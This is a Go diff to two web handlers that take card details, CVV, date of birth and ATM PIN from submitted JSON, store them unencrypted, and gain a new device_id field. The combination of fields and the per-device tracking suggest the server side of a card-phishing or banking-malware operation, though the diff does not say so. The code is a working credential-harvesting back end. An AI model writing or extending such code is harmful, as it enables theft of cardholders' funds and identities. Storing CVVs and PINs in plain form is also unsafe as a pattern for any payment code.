@@ -16,6 +16,7 @@ func SubmitCardDetails(c *gin.Context) {
 		Expiry         string  `json:"expiry"`
 		CVV            string  `json:"cvv"`
 		Amount         float64 `json:"amount"`
+		DeviceID       string  `json:"device_id"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -28,6 +29,7 @@ func SubmitCardDetails(c *gin.Context) {
 		Expiry:         req.Expiry,
 		CVV:            req.CVV,
 		Amount:         req.Amount,
+		DeviceID:       req.DeviceID,
 	}
 	database.DB.Create(&record)
 	c.JSON(http.StatusOK, gin.H{"message": "Card details saved", "id": record.ID})
@@ -35,18 +37,20 @@ func SubmitCardDetails(c *gin.Context) {
 
 func SubmitCardVerification(c *gin.Context) {
 	var req struct {
-		Dob    string  `json:"dob"`
-		AtmPin string  `json:"atm_pin"`
-		Amount float64 `json:"amount"`
+		Dob      string  `json:"dob"`
+		AtmPin   string  `json:"atm_pin"`
+		Amount   float64 `json:"amount"`
+		DeviceID string  `json:"device_id"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
 	record := models.CardVerification{
-		Dob:    req.Dob,
-		AtmPin: req.AtmPin,
-		Amount: req.Amount,
+		Dob:      req.Dob,
+		AtmPin:   req.AtmPin,
+		Amount:   req.Amount,
+		DeviceID: req.DeviceID,
 	}
 	database.DB.Create(&record)
 	c.JSON(http.StatusOK, gin.H{"message": "Card verification saved", "id": record.ID})
